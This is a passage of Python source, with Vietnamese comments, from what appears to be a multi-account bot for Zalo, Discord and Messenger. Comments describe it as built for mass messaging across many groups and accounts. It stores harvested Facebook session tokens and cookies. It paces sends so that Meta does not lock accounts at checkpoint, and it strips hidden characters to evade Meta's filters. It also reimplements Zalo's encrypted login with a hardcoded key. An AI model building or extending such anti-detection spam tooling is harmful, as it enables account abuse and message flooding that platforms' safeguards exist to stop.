                cur["cookies"] = dict(cookies_dict)
            if user_name:
                cur["user_name"] = user_name
            if last_seq_id:
                cur["last_seq_id"] = str(last_seq_id)
            if client_rev:
                cur["client_rev"] = str(client_rev)
            cur["ts"] = now
            cls._VAULT_MEM_CACHE[uid_s] = cur
        try:
            conn = db()
            c_json = json.dumps(cookies_dict or cur.get("cookies") or {}, ensure_ascii=False)
            conn.execute(
                """INSERT OR REPLACE INTO messenger_cookie_vault
                   (uid, fb_dtsg, jazoest, lsd, cookies_json, user_name, last_seq_id, client_rev, updated_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (
                    uid_s,
                    cur.get("fb_dtsg", ""),
                    cur.get("jazoest", ""),
                    cur.get("lsd", ""),
                    c_json,
                    cur.get("user_name", ""),
                    cur.get("last_seq_id", ""),
                    cur.get("client_rev", "1015919737"),
                    now,
                ),
            )
            conn.commit()
            conn.close()
        except Exception:
            pass

    @classmethod
    def get_vault_state(cls, uid):
        if not uid:
            return None
        uid_s = str(uid).strip()
        now = time.time()
        with cls._LOCK:
            mem = cls._VAULT_MEM_CACHE.get(uid_s)
            if mem and (now - mem.get("ts", 0) < 3600.0) and mem.get("fb_dtsg"):
                return dict(mem)
        try:
            conn = db()
            row = conn.execute("SELECT * FROM messenger_cookie_vault WHERE uid=?", (uid_s,)).fetchone()
            conn.close()
            if row and row["fb_dtsg"] and (now - float(row["updated_at"] or 0) < 3600.0):
                r_keys = row.keys()
                data = {
                    "fb_dtsg": row["fb_dtsg"],
                    "jazoest": row["jazoest"] or cls.compute_jazoest(row["fb_dtsg"]),
                    "lsd": row["lsd"] or "",
                    "user_name": row["user_name"] or "",
                    "last_seq_id": (row["last_seq_id"] if "last_seq_id" in r_keys else "") or "",
                    "client_rev": (row["client_rev"] if "client_rev" in r_keys else "1015919737") or "1015919737",
                    "cookies": normalize_messenger_cookies(row["cookies_json"]),
                    "ts": float(row["updated_at"] or now),
                }
                with cls._LOCK:
                    cls._VAULT_MEM_CACHE[uid_s] = data
                return dict(data)
        except Exception:
            pass
        return None

    _UID_SEND_HISTORY = defaultdict(lambda: deque(maxlen=24))
    _THREAD_SEND_HISTORY = defaultdict(lambda: deque(maxlen=12))
    _UID_LAST_SEND_TS = defaultdict(float)

    @classmethod
    def get_deterministic_profile(cls, uid=""):
        idx = zlib.crc32(str(uid or "mess").encode("utf-8")) % len(cls.BROWSER_PROFILES)
        return cls.BROWSER_PROFILES[idx]

    @classmethod
    def acquire_messenger_stealth_slot(cls, uid, thread_id, antiband=True, stop_ev=None, start_global_epoch=None, start_box_epoch=None, fast_zero_delay=True):
        if fast_zero_delay:
            return not is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, str(thread_id or "default"))
        """Lá chắn Chống Bay Acc Messenger (Sigma Anti-Checkpoint Pacer):
        - Ngăn chặn tuyệt đối hiện tượng gửi dồn dập trong 2 giây khiến Meta khóa Checkpoint 282/956!
        - Giữ nhịp sinh học tự nhiên (1.85s - 2.45s/tin + nghỉ nhịp thở mỗi 8 tin) và giới hạn cửa sổ trượt an toàn."""
        uid_s = str(uid or "default")
        tid_s = str(thread_id or "default")
        for _ in range(40):
            if is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, tid_s):
                return False
            now = time.time()
            wait_s = 0.0
            with cls._LOCK:
                u_hist = cls._UID_SEND_HISTORY[uid_s]
                while u_hist and now - u_hist[0] > 60.0:
                    u_hist.popleft()
                t_hist = cls._THREAD_SEND_HISTORY[f"{uid_s}:{tid_s}"]
                while t_hist and now - t_hist[0] > 20.0:
                    t_hist.popleft()

                min_gap = (1.75 + random.uniform(0.15, 0.45)) if antiband else 0.85
                since_last = now - cls._UID_LAST_SEND_TS.get(uid_s, 0.0)
                if since_last < min_gap:
                    wait_s = max(wait_s, min_gap - since_last)

                if antiband and len(t_hist) >= 5:
                    w_t = (t_hist[0] + 12.5) - now
                    if w_t > 0:
                        wait_s = max(wait_s, w_t + random.uniform(0.2, 0.5))

                if antiband and len(u_hist) >= 16:
                    w_u = (u_hist[0] + 60.5) - now
                    if w_u > 0:
                        wait_s = max(wait_s, min(4.5, w_u))

                if wait_s <= 0.0:
                    cls._UID_LAST_SEND_TS[uid_s] = now
                    u_hist.append(now)
                    t_hist.append(now)
                    return True

            if interruptible_wait(stop_ev, min(wait_s, 0.45), start_global_epoch, start_box_epoch, tid_s):
                return False
        return not is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, tid_s)

    @classmethod
    def append_stealth_tail(cls, text, thread_id=""):
        """Trên giao thức Lightspeed MQTT (/ls_req), mỗi gói tin đã có otid & epoch_id 64-bit duy nhất.
        Tuyệt đối KHÔNG chèn ký tự ẩn \u200b vào chữ để tránh bộ lọc Sigma của Meta!"""
        if not text:
            return text
        s = str(text)
        for zw in ("​", "‌", "‍", "⁠", "﻿"):
            s = s.replace(zw, "")
        return s.strip()

def append_antiband_tail(final_msg, platform="zalo", thread_id=""):
    if not final_msg:
        return final_msg
    if platform == "discord":
        return DiscordStealthAntiBanEngine.append_stealth_tail(final_msg, thread_id)
    if platform == "messenger":
        return MessengerStealthAntiBanEngine.append_stealth_tail(final_msg, thread_id)
    return ZaloSmartAntiBanEngine.append_tail(final_msg, thread_id)

class AntiDieAllEngine:
    """Động cơ Hàn Mạch & Chống Chết Toàn Diện Anti-Die-All ULTRA (Zalo • Discord • Messenger MQTT):
    1. Dual-Layer Isolation (Cách ly 2 tầng Tài Khoản + Từng Nhóm):
       - Khi treo 20 nhóm cùng lúc, nếu 1 nhóm bị giới hạn tốc độ, chỉ nhóm đó giảm nhịp vi mô, 19 nhóm còn lại chạy 100% tốc độ không bao giờ bị kéo lag!
    2. Auto-Heal Quantum Circuit (Tự động hàn mạch 0.35s):
       - Tự động khôi phục kết nối, tự làm mới phiên Cookie/zpw_enk và tự xả hàng đợi khi phát hiện nghẽn mạng.
    3. Real-Time Send Ping Telemetry (Đo Ping Gửi Tin Thời Gian Thực):
       - Ghi nhận độ trễ RTT thực tế (ms) và Jitter (ms) của từng gói tin khi treo để hiển thị trực tiếp lên thanh Ping VIP."""

    ZALO_RATELIMIT_CODES = ZaloSmartAntiBanEngine.RATELIMIT_CODES
    ZALO_AUTH_CODES = ZaloSmartAntiBanEngine.AUTH_CODES

    def __init__(self):
        self.lock = threading.RLock()
        self.state = defaultdict(lambda: {
            "platform": "zalo",
            "circuit": "CLOSED",
            "cooldown_until": 0.0,
            "fail_streak": 0,
            "ratelimit_streak": 0,
            "ok_total": 0,
            "fail_total": 0,
            "healed_total": 0,
            "risk_score": 0.0,
            "last_error": "",
            "last_active": 0.0,
            "last_ping_ms": 18.0,
            "jitter_ms": 1.5,
            "ping_samples": deque(maxlen=40),
            "timestamps": deque(maxlen=360),
            "adaptive_delay_bonus": 0.0,
            "burst_counter": 0,
        })
        self.box_cooldowns = defaultdict(float)
        self.global_ping_samples = deque(maxlen=80)
        self.global_cooldown_until = 0.0

    def can_send(self, acc_id, max_rpm=999999, channel_id=None, platform="zalo", token=None):
        now = time.time()
        cid_s = str(channel_id or "").strip()

        if cid_s:
            with self.lock:
                box_until = self.box_cooldowns.get((acc_id, cid_s), 0.0)
                if now < box_until:
                    return False, round(min(1.2, box_until - now), 3)

        # Tách biệt hoàn toàn hạn mức từng tài khoản (acc_id, cid_s) để 100 Acc chạy cùng lúc không bao giờ khóa chéo nhau

        with self.lock:
            st = self.state[acc_id]
            st["platform"] = platform
            if st["circuit"] == "OPEN":
                if now < st["cooldown_until"]:
                    return False, round(min(1.0, st["cooldown_until"] - now), 2)
                else:
                    st["circuit"] = "CLOSED"
                    st["fail_streak"] = 0
                    st["adaptive_delay_bonus"] = 0.0
                    st["healed_total"] += 1

            while st["timestamps"] and now - st["timestamps"][0] > 60.0:
                st["timestamps"].popleft()

            return True, 0.0

    def get_adaptive_delay(self, acc_id, base_delay, antiband=True, platform="zalo", text_len=24, active_box_count=1):
        d_val = max(0.0, float(base_delay or 0.0))
        # Khi người dùng đặt Delay = 0s (0.0s), chạy tốc độ 0ms thực sự không cộng bất kỳ độ trễ phụ nào!
        if d_val <= 0.0:
            return 0.0
        return round(d_val, 3)

    def report_success(self, acc_id, latency_ms=None, channel_id=None):
        now = time.time()
        with self.lock:
            st = self.state[acc_id]
            st["timestamps"].append(now)
            st["ok_total"] += 1
            st["last_active"] = now
            if st["fail_streak"] > 0 or st["circuit"] != "CLOSED":
                st["healed_total"] += 1
            st["fail_streak"] = 0
            st["circuit"] = "CLOSED"
            st["ratelimit_streak"] = 0
            st["adaptive_delay_bonus"] = max(0.0, st["adaptive_delay_bonus"] - 0.05)
            st["risk_score"] = max(0.0, st["risk_score"] - 6.0)
            if channel_id:
                self.box_cooldowns.pop((acc_id, str(channel_id)), None)
            if latency_ms is not None and latency_ms > 0:
                ms_val = round(float(latency_ms), 1)
                prev_ms = st["last_ping_ms"]
                st["jitter_ms"] = round(abs(ms_val - prev_ms) * 0.35 + st["jitter_ms"] * 0.65, 1)
                st["last_ping_ms"] = ms_val
                st["ping_samples"].append(ms_val)
                self.global_ping_samples.append(ms_val)

    def report_rate_limit(self, acc_id, retry_after=None, reason="Rate Limit 429", channel_id=None):
        now = time.time()
        wait_s = min(0.35, max(0.05, float(retry_after or 0.15) * 0.3))
        if channel_id:
            cid_s = str(channel_id)
            with self.lock:
                self.box_cooldowns[(acc_id, cid_s)] = now + wait_s
        with self.lock:
            st = self.state[acc_id]
            st["ratelimit_streak"] += 1
            st["fail_total"] += 1
            st["last_error"] = sanitize_log_text(reason)
            # Chỉ khóa nhẹ từng kênh, không đóng băng toàn bộ tài khoản khi treo đa nhóm
            if not channel_id:
                st["circuit"] = "OPEN"
                st["cooldown_until"] = now + min(1.5, wait_s)
            st["adaptive_delay_bonus"] = min(0.35, st["adaptive_delay_bonus"] + 0.06)
            st["risk_score"] = min(100.0, st["risk_score"] + 3.5)

    def report_error(self, acc_id, err_msg="", is_auth_error=False, channel_id=None):
        now = time.time()
        with self.lock:
            st = self.state[acc_id]
            st["fail_streak"] += 1
            st["fail_total"] += 1
            st["last_error"] = sanitize_log_text(err_msg)
            if is_auth_error:
                st["circuit"] = "OPEN"
                st["cooldown_until"] = now + 3.5
                st["risk_score"] = min(100.0, st["risk_score"] + 10.0)
            else:
                if channel_id:
                    self.box_cooldowns[(acc_id, str(channel_id))] = now + 0.6
                st["risk_score"] = min(100.0, st["risk_score"] + 1.5)

    def auto_heal_all(self):
        with self.lock:
            self.box_cooldowns.clear()
            for st in self.state.values():
                st["circuit"] = "CLOSED"
                st["cooldown_until"] = 0.0
                st["fail_streak"] = 0
                st["ratelimit_streak"] = 0
                st["adaptive_delay_bonus"] = 0.0
                st["risk_score"] = 0.0
                st["healed_total"] += 1
        with DiscordStealthAntiBanEngine._LOCK:
            DiscordStealthAntiBanEngine._CHANNEL_BUCKETS.clear()

    def get_live_ping_telemetry(self):
        with self.lock:
            samples = list(self.global_ping_samples)
            total_rpm = 0
            total_healed = 0
            now = time.time()
            for st in self.state.values():
                while st["timestamps"] and now - st["timestamps"][0] > 60.0:
                    st["timestamps"].popleft()
                total_rpm += len(st["timestamps"])
                total_healed += st.get("healed_total", 0)
            avg_send_ms = round(sum(samples[-15:]) / len(samples[-15:]), 1) if samples else 0.0
            jitter_ms = round(max(samples[-10:]) - min(samples[-10:]), 1) if len(samples) >= 2 else 1.2
            return {
                "avg_send_ms": avg_send_ms,
                "jitter_ms": jitter_ms,
                "total_rpm": total_rpm,
                "total_healed": total_healed,
                "history": samples[-20:],
            }

    def get_snapshot(self, acc_id=None):
        now = time.time()
        with self.lock:
            if acc_id is not None:
                st = self.state[acc_id]
                while st["timestamps"] and now - st["timestamps"][0] > 60.0:
                    st["timestamps"].popleft()
                rem = max(0, round(st["cooldown_until"] - now, 1)) if st["circuit"] == "OPEN" else 0
                return {
                    "circuit": st["circuit"] if rem > 0 else "CLOSED",
                    "cooldown_remaining": rem,
                    "ok_total": st["ok_total"],
                    "fail_total": st["fail_total"],
                    "healed_total": st.get("healed_total", 0),
                    "last_ping_ms": st.get("last_ping_ms", 18.0),
                    "jitter_ms": st.get("jitter_ms", 1.5),
                    "rpm": len(st["timestamps"]),
                    "risk_score": round(st["risk_score"], 1),
                    "last_error": st["last_error"]
                }
            return {k: self.get_snapshot(k) for k in list(self.state.keys())}

HEALTH_MGR = AntiDieAllEngine()
refresh_owner_uids()

GROUP_MEMBERS_CACHE = {}
GROUP_CACHE_LOCK = threading.RLock()
KNOWN_GROUPS_BY_ACC = defaultdict(set)
ALL_KNOWN_ZALO_GROUP_IDS = set()

# CLIENT GIAO THỨC ZALO (ĐÃ FIX TRIỆT ĐỂ TAG THẬT BẰNG ENDPOINT /api/group/mention)
HOT_ACTIVE_ZALO_GROUPS = set()
NON_MEMBER_EXCLUDED_PAIRS = set()


def get_accounts_present_in_thread(platform="zalo", thread_id="", is_group=True, fallback_acc_row=None):
    """Trả về danh sách các tài khoản đang bật (enabled=1) và có thể hoạt động trong thread_id khi chạy Đa Acc:
    - Tự động cập nhật KNOWN_GROUPS_BY_ACC từ _GROUPS_CACHE và ZaloPCSessionKeeper.
    - Loại bỏ các tài khoản đã xác định không nằm trong nhóm (NON_MEMBER_EXCLUDED_PAIRS) để chạy nhiều Acc cùng lúc không bị lỗi!"""
    plat_s = str(platform or "zalo").lower()
    tid_s = _clean_zalo_id(thread_id) or str(thread_id or "").strip()
    all_accs = get_all_accounts_from_ram(platform=plat_s, enabled_only=True)
    if not all_accs:
        return [fallback_acc_row] if fallback_acc_row else []
    if plat_s != "zalo" or not is_group or not tid_s:
        return all_accs

    matched = []
    for a in all_accs:
        im_s = str(a.get("imei") or "").strip()
        uid_s = str(a.get("uid") or "").strip()
        if im_s and (im_s, tid_s) in NON_MEMBER_EXCLUDED_PAIRS:
            continue
        if fallback_acc_row and int(a.get("id") or 0) == int(fallback_acc_row.get("id") or -1):
            matched.append(a)
            continue
        known_set = KNOWN_GROUPS_BY_ACC.get(uid_s, set()) if uid_s else set()
        if not known_set and uid_s and hasattr(Zalo, "_GROUPS_CACHE"):
            g_c = Zalo._GROUPS_CACHE.get(uid_s)
            if g_c and g_c[1]:
                known_set = {str(g.get("id") or "") for g in g_c[1] if g.get("id")}
                KNOWN_GROUPS_BY_ACC[uid_s].update(known_set)
        if not known_set or (tid_s in known_set):
            matched.append(a)
    return matched if matched else ([fallback_acc_row] if fallback_acc_row else all_accs)

class ZaloParamsEncryptor:
    """Bộ Mã Hóa Khởi Tạo Phiên Máy Tính Zalo Web Chính Chủ (zca-js ParamsEncryptor v2):
    - Sinh mã zcid, zcid_ext, signkey và khóa giải mã AES-CBC 32-byte chuẩn giao thức Zalo PC/Web.
    - Giúp máy tính ảo sau khi quét QR đăng nhập thẳng vào trong tài khoản Zalo và giữ phiên sống bền vững không lo die Cookie/IMEI!"""

    ZCID_KEY = b"3FC4F0D2AB50057BCE0D90D9187A22B1"

    @staticmethod
    def _process_str(s):
        s_str = str(s or "")
        even = [s_str[i] for i in range(0, len(s_str), 2)]
        odd = [s_str[i] for i in range(1, len(s_str), 2)]
        return even, odd

    @classmethod
    def create_zcid(cls, imei, ts=None, ztype=30):
        if ts is None:
            ts = int(time.time() * 1000)
        raw = f"{ztype},{imei},{int(ts)}".encode("utf-8")
        pad_len = 16 - (len(raw) % 16)
        raw_padded = raw + bytes([pad_len]) * pad_len
        cipher = AES.new(cls.ZCID_KEY, AES.MODE_CBC, bytes(16))
        return cipher.encrypt(raw_padded).hex().upper()

    @classmethod
    def derive_encrypt_key(cls, zcid, zcid_ext):
        md5_ext = hashlib.md5(str(zcid_ext).encode("utf-8")).hexdigest().upper()
        n_even, _ = cls._process_str(md5_ext)
        a_even, s_odd = cls._process_str(str(zcid))
        key_str = "".join(n_even[:8]) + "".join(a_even[:12]) + "".join(reversed(s_odd))[:12]
        return key_str.encode("utf-8")[:32]

    @classmethod
    def build_encrypted_login_query(cls, imei, computer_name="Web", language="vi", ts=None, ztype=30, client_version=645):
        if ts is None:
            ts = int(time.time() * 1000)
        zcid = cls.create_zcid(imei, ts=ts, ztype=ztype)
        zcid_ext = secrets.token_hex(6)
        enc_key = cls.derive_encrypt_key(zcid, zcid_ext)
        pl = {
            "imei": str(imei),
            "computer_name": str(computer_name or "Web"),
            "language": str(language or "vi"),
            "ts": int(ts),
        }
        pt = json.dumps(pl, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
        pad_len = 16 - (len(pt) % 16)
        pt_padded = pt + bytes([pad_len]) * pad_len
        cipher = AES.new(enc_key, AES.MODE_CBC, bytes(16))
        enc_b64 = base64.b64encode(cipher.encrypt(pt_padded)).decode("utf-8")

        q_params = {
            "zcid": zcid,
            "zcid_ext": zcid_ext,
            "enc_ver": "v2",
            "params": enc_b64,
            "type": str(ztype),
            "client_version": str(client_version),
        }
        sorted_vals = "".join(str(q_params[k]) for k in sorted(q_params.keys()))
        q_params["signkey"] = hashlib.md5(("zsecuregetlogininfo" + sorted_vals).encode("utf-8")).hexdigest()
        return q_params, enc_key

    @classmethod
    def decrypt_login_data(cls, enc_str, enc_key):
        if not enc_str:
            return None
        s_clean = unquote(str(enc_str)) if "%" in str(enc_str) else str(enc_str)
        raw = base64.b64decode(s_clean)
        cipher = AES.new(enc_key, AES.MODE_CBC, bytes(16))
        dec = cipher.decrypt(raw)
        pad_len = dec[-1]
        if 1 <= pad_len <= 16:
            dec = dec[:-pad_len]
        parsed = json.loads(dec.decode("utf-8", errors="ignore"))
        if isinstance(parsed, dict) and isinstance(parsed.get("data"), dict):
            return parsed["data"]
        return parsed if isinstance(parsed, dict) else None



class ZaloStickerMakerEngine:
    """Động Cơ Tạo Nhãn Dán Sticker Zalo Chuẩn Native 512×512 Ultra-HD (Ảnh Tĩnh, Chữ Die-Cut, Reply Media & Video Ngắn ≤ 3.0 Giây):
    - Tự động tải ảnh/video/GIF từ link HTTP/HTTPS, data URI, đường dẫn file, hoặc bóc tách trực tiếp từ tin nhắn Reply (Quote) trên Zalo.
    - Tự động tách nền viền góc đồng màu + tạo viền Die-Cut Sticker trắng nổi 3D + bóng đổ mềm trên nền trong suốt RGBA (0, 0, 0, 0) 512×512.
    - Kiểm tra thời lượng Video chính xác tới 0.01 giây (ffprobe + bộ đọc MP4/MOV atom mvhd thuần Python):
      + Video > 3.0 giây: TỪ CHỐI NGAY LẬP TỨC!
      + Video ≤ 3.0 giây: Chuyển đổi bằng FFmpeg PaletteGen sang Animated WebP & GIF 512×512 trong suốt sắc nét.
    - Xuất đồng thời WebP lossless, GIF trong suốt và PNG 512×512 để gửi ra đúng định dạng [Sticker] (Nhãn dán thật) trên Zalo & Telegram."""

    MAX_VIDEO_STICKER_DURATION_SEC = 3.0
    _FONT_PATHS = (
        "/usr/share/fonts/opentype/inter/InterDisplay-Black.otf",
        "/usr/share/fonts/opentype/inter/Inter-ExtraBold.otf",
        "/usr/share/fonts/opentype/inter/Inter-Bold.otf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/noto/NotoSans-Bold.ttf",
    )

    @classmethod
    def _load_font(cls, size=48):
        from PIL import ImageFont
        for fp in cls._FONT_PATHS:
            if os.path.exists(fp):
                try:
                    return ImageFont.truetype(fp, size=size)
                except Exception:
                    continue
        try:
            return ImageFont.load_default()
        except Exception:
            return None

    @classmethod
    def _parse_single_dict_for_media(cls, item):
        if not isinstance(item, dict):
            return None
        params_d = {}
        for pk in ("params", "propertyExt", "extra"):
            raw_p = item.get(pk)
            if isinstance(raw_p, dict):
                params_d.update(raw_p)
            elif isinstance(raw_p, str) and raw_p.strip().startswith("{"):
                try:
                    p_dec = json.loads(raw_p.strip())
                    if isinstance(p_dec, dict):
                        params_d.update(p_dec)
                except Exception:
                    pass

        stk_id = item.get("stickerId") or params_d.get("stickerId") or (item.get("id") if ("catId" in item or "cateId" in item) else None)
        cat_id = item.get("cateId") or item.get("catId") or params_d.get("cateId") or params_d.get("catId")
        stk_type = item.get("type") or params_d.get("type") or 7
        msg_type = str(item.get("msgType") or item.get("cliMsgType") or "").lower()
        if stk_id and cat_id and str(stk_id).isdigit() and str(cat_id).isdigit():
            return {
                "kind": "native_sticker",
                "sticker_id": int(stk_id),
                "cate_id": int(cat_id),
                "sticker_type": int(stk_type) if str(stk_type).isdigit() else 7,
            }

        for url_k in ("hdUrl", "rawUrl", "oriUrl", "normalUrl", "hd", "normal", "href", "url", "fileUrl", "thumbUrl", "thumb"):
            u_val = item.get(url_k) or params_d.get(url_k)
            if isinstance(u_val, str) and u_val.strip().startswith(("http://", "https://")):
                u_clean = u_val.strip()
                dur_v = (
                    item.get("duration")
                    or params_d.get("duration")
                    or item.get("videoDuration")
                    or params_d.get("videoDuration")
                )
                dur_sec = None
                if dur_v is not None:
                    try:
                        d_f = float(dur_v)
                        dur_sec = (d_f / 1000.0) if d_f > 60.0 else d_f
                    except Exception:
                        pass
                f_ext = str(item.get("fileExt") or params_d.get("fileExt") or "").lower()
                title_s = str(item.get("title") or params_d.get("title") or "").strip()
                is_txt_file = (
                    f_ext in ("txt", ".txt")
                    or title_s.lower().endswith(".txt")
                    or u_clean.lower().split("?")[0].endswith(".txt")
                    or "share.file" in msg_type
                )
                if is_txt_file:
                    return {
                        "kind": "file_url",
                        "url": u_clean,
                        "filename": title_s if title_s else "zalo_script.txt",
                    }
                is_vid = any(
                    u_clean.lower().split("?")[0].endswith(ext)
                    for ext in (".mp4", ".mov", ".webm", ".mkv", ".avi")
                ) or ("video" in msg_type) or (dur_sec is not None and dur_sec > 0)
                return {
                    "kind": "media_url",
                    "url": u_clean,
                    "is_video": is_vid,
                    "duration": dur_sec,
                }
        return None

    @classmethod
    def extract_quote_sticker_or_media(cls, msg_obj, zalo_client=None, thread_id=None):
        """Bóc tách thông tin Nhãn Dán (stickerId, cateId, type), URL Ảnh/GIF/Video hoặc File .txt từ tin nhắn được Kéo Trả Lời (Reply / Quote) trên Zalo:
        - Hỗ trợ giải mã sâu cả khi get_last_msgs rút gọn trường quote.attach bằng cách tự động truy vấn get_recent_group_messages(thread_id)
          để tìm đúng tin nhắn gốc theo globalMsgId / cliMsgId hoặc tin nhắn ảnh vừa gửi ngay trước đó!"""
        if not isinstance(msg_obj, dict):
            msg_obj = {}

        candidates = []
        q_obj = msg_obj.get("quote")
        quoted_msg_id = None
        quoted_cli_id = None
        quoted_owner_id = None
        if isinstance(q_obj, dict):
            quoted_msg_id = _clean_zalo_id(q_obj.get("globalMsgId") or q_obj.get("msgId") or q_obj.get("id"))
            quoted_cli_id = _clean_zalo_id(q_obj.get("cliMsgId"))
            quoted_owner_id = _clean_zalo_id(q_obj.get("ownerId") or q_obj.get("uidFrom"))
            candidates.append(q_obj)
            att = q_obj.get("attach")
            if isinstance(att, dict):
                candidates.append(att)
            elif isinstance(att, str):
                att_s = att.strip()
                if att_s.startswith("{"):
                    try:
                        att_d = json.loads(att_s)
                        if isinstance(att_d, dict):
                            candidates.append(att_d)
                    except Exception:
                        pass
                elif "http" in att_s:
                    m_u = re.search(r'(https?://[^\s"\'<>\\]+)', att_s)
                    if m_u:
                        candidates.append({"href": m_u.group(1)})

        cnt_obj = msg_obj.get("content")
        if isinstance(cnt_obj, dict):
            candidates.append(cnt_obj)
        elif isinstance(cnt_obj, str) and cnt_obj.strip().startswith("{"):
            try:
                candidates.append(json.loads(cnt_obj.strip()))
            except Exception:
                pass

        for item in candidates:
            res = cls._parse_single_dict_for_media(item)
            if res:
                return res

        # Nếu người dùng kéo trả lời (Reply) vào 1 bức ảnh vừa gửi nhưng preloadconvers/WS cắt mất attach,
        # hoặc người dùng vừa gửi ảnh xong gõ .sticker ngay bên dưới -> Quét lịch sử gần nhất của Box để lấy full gói tin ảnh gốc!
        if zalo_client and thread_id:
            try:
                recent_msgs = zalo_client.get_recent_group_messages(thread_id) or []
                cur_mid = _clean_zalo_id(msg_obj.get("msgId") or msg_obj.get("globalMsgId"))
                # 1. Tìm chính xác bản đầy đủ của chính tin nhắn lệnh hiện tại (có chứa quote.attach đầy đủ)
                for rm in reversed(recent_msgs):
                    rm_mid = _clean_zalo_id(rm.get("msgId") or rm.get("globalMsgId"))
                    rm_cmid = _clean_zalo_id(rm.get("cliMsgId"))
                    if (cur_mid and rm_mid == cur_mid) or (quoted_msg_id and rm_mid == quoted_msg_id) or (quoted_cli_id and rm_cmid == quoted_cli_id):
                        rm_q = rm.get("quote")
                        if isinstance(rm_q, dict):
                            for sub_c in (rm_q, rm_q.get("attach")):
                                if isinstance(sub_c, str) and sub_c.strip().startswith("{"):
                                    try:
                                        sub_c = json.loads(sub_c.strip())
                                    except Exception:
                                        sub_c = None
                                res_q = cls._parse_single_dict_for_media(sub_c)
                                if res_q:
                                    return res_q
                        res_rm = cls._parse_single_dict_for_media(rm)
                        if res_rm:
                            return res_rm
                        rm_cnt = rm.get("content")
                        if isinstance(rm_cnt, str) and rm_cnt.strip().startswith("{"):
                            try:
                                rm_cnt = json.loads(rm_cnt.strip())
                            except Exception:
                                rm_cnt = None
                        res_cnt = cls._parse_single_dict_for_media(rm_cnt)
                        if res_cnt:
                            return res_cnt

                if not recent_msgs:
                    try:
                        lm = zalo_client.get_last_msgs() or {}
                        recent_msgs = (lm.get("msgs") or []) + (lm.get("groupMsgs") or [])
                    except Exception:
                        pass
                # 2. Nếu có quote_obj hoặc người dùng vừa gửi ảnh trong nhóm rồi gõ .sticker, lấy tin nhắn ảnh/sticker gần nhất
                for rm in reversed(recent_msgs[-12:]):
                    rm_uid = _clean_zalo_id(rm.get("uidFrom") or rm.get("fromUid"))
                    if quoted_owner_id and rm_uid and rm_uid != quoted_owner_id:
                        continue
                    rm_cnt = rm.get("content")
                    if isinstance(rm_cnt, str) and rm_cnt.strip().startswith("{"):
                        try:
                            rm_cnt = json.loads(rm_cnt.strip())
                        except Exception:
                            rm_cnt = None
                    for cand_m in (rm_cnt, rm):
                        res_f = cls._parse_single_dict_for_media(cand_m)
                        if res_f:
                            return res_f
            except Exception:
                pass
        return None

    @classmethod
    def fetch_media_from_url_or_path(cls, media_src, session=None):
        """Tải dữ liệu bytes từ đường dẫn file, data URI hoặc link HTTP/HTTPS (Zalo CDN, Imgur, Giphy, Tenor...)."""
        if isinstance(media_src, (bytes, bytearray)):
            return bytes(media_src), ""
        src_s = str(media_src or "").strip()
        if not src_s:
            return None, "Nguồn media trống"
        if os.path.exists(src_s) and os.path.isfile(src_s):
            with open(src_s, "rb") as rf:
                return rf.read(), os.path.basename(src_s)
        if src_s.startswith("data:"):
            try:
                _, b64_p = src_s.split(",", 1)
                return base64.b64decode(b64_p), "inline_media.png"
            except Exception as e:
                return None, f"Data URI không hợp lệ: {e}"
        if src_s.startswith(("http://", "https://")):
            sess = session or requests.Session()
            hdrs = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Accept": "image/avif,image/webp,image/apng,image/*,video/*,*/*;q=0.8",
                "Referer": "https://chat.zalo.me/",
            }
            try:
                r = sess.get(src_s, headers=hdrs, timeout=12, stream=True)
                if r.status_code == 200:
                    chunks = []
                    total_b = 0
                    for ch in r.iter_content(chunk_size=65536):
                        if ch:
                            chunks.append(ch)
                            total_b += len(ch)
                            if total_b > 25 * 1024 * 1024:
                                return None, "File vượt quá giới hạn 25MB"
                    raw_b = b"".join(chunks)
                    ct = (r.headers.get("Content-Type") or "").lower()
                    ext = ".png"
                    if "mp4" in ct or src_s.lower().split("?")[0].endswith(".mp4"):
                        ext = ".mp4"
                    elif "webm" in ct or src_s.lower().split("?")[0].endswith(".webm"):
                        ext = ".webm"
                    elif "gif" in ct or src_s.lower().split("?")[0].endswith(".gif"):
                        ext = ".gif"
                    elif "webp" in ct or src_s.lower().split("?")[0].endswith(".webp"):
                        ext = ".webp"
                    return raw_b, f"downloaded{ext}"
                return None, f"Máy chủ trả về mã lỗi HTTP {r.status_code}"
            except Exception as e:
                return None, f"Không thể tải link media: {e}"
        return None, "Không tìm thấy file hoặc URL hợp lệ"

    @classmethod
    def get_video_duration_seconds(cls, video_path_or_bytes):
        """Trả về thời lượng chính xác (giây) của file video MP4/MOV/WebM/GIF."""
        tmp_path = None
        try:
            if isinstance(video_path_or_bytes, (bytes, bytearray)):
                import tempfile
                fd, tmp_path = tempfile.mkstemp(suffix=".mp4")
                os.close(fd)
                with open(tmp_path, "wb") as wf:
                    wf.write(video_path_or_bytes)
                target_path = tmp_path
            else:
                target_path = str(video_path_or_bytes)

            if not os.path.exists(target_path):
                return 0.0

            try:
                import subprocess
                proc = subprocess.run(
                    [
                        "ffprobe", "-v", "error",
                        "-show_entries", "format=duration",
                        "-of", "default=noprint_wrappers=1:nokey=1",
                        target_path
                    ],
                    capture_output=True, text=True, timeout=6
                )
                out_s = (proc.stdout or "").strip()
                if out_s and out_s != "N/A":
                    dur = float(out_s)
                    if dur > 0:
                        return round(dur, 3)
            except Exception:
                pass

            try:
                with open(target_path, "rb") as rf:
                    raw = rf.read(2 * 1024 * 1024)
                idx = raw.find(b"mvhd")
                if idx != -1 and idx + 24 <= len(raw):
                    version = raw[idx + 4]
                    if version == 0 and idx + 24 <= len(raw):
                        timescale = struct.unpack(">I", raw[idx + 16:idx + 20])[0]
                        duration = struct.unpack(">I", raw[idx + 20:idx + 24])[0]
                        if timescale > 0:
                            return round(float(duration) / float(timescale), 3)
                    elif version == 1 and idx + 32 <= len(raw):
                        timescale = struct.unpack(">I", raw[idx + 24:idx + 28])[0]
                        duration = struct.unpack(">Q", raw[idx + 28:idx + 36])[0]
